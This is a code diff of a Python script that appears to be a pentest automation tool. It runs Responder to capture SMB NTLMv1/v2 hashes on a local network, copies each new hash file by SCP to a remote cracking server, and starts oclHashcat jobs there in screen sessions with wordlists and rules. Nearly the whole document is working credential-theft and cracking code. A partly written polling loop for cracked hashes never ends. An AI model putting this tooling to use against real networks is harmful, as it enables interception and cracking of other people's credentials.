@@ -26,10 +26,9 @@ def launch_responder():
     Launches Responder
     '''
     DN = open(os.devnull, 'w')
-    cmd = 'python Responder.py -I eth0'
+    cmd = 'sudo xterm -hold -e python Responder.py -I eth0 -w'
     print '[*] Running: {}'.format(cmd)
     rspndr = subprocess.Popen(cmd.split(), stdout=DN, stderr=DN, preexec_fn=os.setsid)
-    #out,err = process.communicate()
     return rspndr
 
 def get_user_creds():
@@ -42,6 +41,7 @@ def parse_resp_output(hash_files):
 
     for f in os.listdir("logs"):
         if f not in hash_files:
+            # Specifically check for SMB stuff, exapand on this later
             if 'SMB-NTLM' in f:
                 new_hash_files.append(f)
 
@@ -50,25 +50,43 @@ def parse_resp_output(hash_files):
 def ssh_client(server, port, user, pw):
     client = paramiko.SSHClient()
     client.load_system_host_keys()
+    # Auto add host keys to known_keys
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(server, port, user, pw)
+    try:
+        client.connect(server, port, user, pw)
+    except paramiko.AuthenticationException:
+        sys.exit('[-] Authentication failed')
     return client
 
 def make_hashcat_cmd(hash_file, user):
     ran_str = ''.join(random.choice(string.letters) for x in range(5))
     identifier = user+'-'+ran_str
-    hashcat_cmd  = '/opt/oclHashcat-1.36/oclHashcat64.bin --session {}'.format(identifier)
-    hashcat_cmd += ' -m {} '
-    hashcat_cmd += '-o {} /tmp/{} /opt/wordlists/* -r /opt/oclHashcat-1.36/rules/best64.rule'.format(identifier, hash_file)
+    hashcat  = '/opt/oclHashcat-1.36/oclHashcat64.bin --session {}'.format(identifier)
+    hashcat += ' -m {} '
+    hashcat += '-o {} /tmp/{} /opt/wordlists/* -r /opt/oclHashcat-1.36/rules/best64.rule'.format(identifier, hash_file)
     match = re.match('SMB-NTLM(v1|v2)', hash_file)
     if match:
         hashtype = match.group()
         if hashtype == 'SMB-NTLMv1':
-            hashcat_cmd = hashcat_cmd.format('5500')
+            hashcat = hashcat.format('5500')
+            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
         elif hashtype == 'SMB-NTLMv2':
-            hashcat_cmd = hashcat_cmd.format('5600')
+            hashcat = hashcat.format('5600')
+            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
 
-        print hashcat_cmd
+        print '[+] Running on crackerbox:'
+        print '    {}'.format(screen)
+        return screen, identifier
+
+def find_cracked_hashes(ssh, identifier):
+    '''
+    Read the .pot hashcat files for cracked hashes
+    '''
+    found = False
+    while found == False:
+        cmd = 'cat {}'.format(identifier)
+        stdin, stdout, stderr = ssh.exec_command(cmd)
+        print ':', stdout.read()
 
 def main(args):
 
@@ -76,31 +94,39 @@ def main(args):
     if os.geteuid() != 0:
         sys.exit('[-] Please run as root')
 
-    user, pw = get_user_creds()
     hash_files = []
     sent_hashes = []
-
-    #Launch responder
-    #rspndr = launch_responder()
-    ssh = ssh_client('10.0.0.240', 22, user, pw)
-    scp = SCPClient(ssh.get_transport())
+    identifiers = []
     remote_path = '/tmp/{}'
     loc_path = os.getcwd()+'/logs/{}'
 
+    # Setup scp
+    user, pw = get_user_creds()
+    ssh = ssh_client('10.0.0.240', 22, user, pw)
+    scp = SCPClient(ssh.get_transport())
+
+    #Launch responder
+    rspndr = launch_responder()
+
+    # Check for new hashes and send them off
     try:
         while 1:
-            time.sleep(1)
             new_hash_files = parse_resp_output(hash_files)
             hash_files = hash_files + list(set(new_hash_files) - set(hash_files))
             unsent = [h for h in hash_files if h not in sent_hashes]
             for u in unsent:
-                hashcat_cmd = make_hashcat_cmd(u, user)
+                print '[+] New hash found!'
                 scp.put(loc_path.format(u), remote_path.format(u))
                 sent_hashes.append(u)
+                hashcat_cmd, identifier = make_hashcat_cmd(u, user)
+                if identifier not in identifiers:
+                    identifiers.append(identifier)
+                # Execute the screen session on crackerbox
+                stdin, stdout, stderr = ssh.exec_command(hashcat_cmd)
+            time.sleep(1)
 
     except KeyboardInterrupt:
         print '[*] Killing Responder'
         os.killpg(rspndr.pid, signal.SIGTERM)
-        print 'done'
 
 main(parse_args())
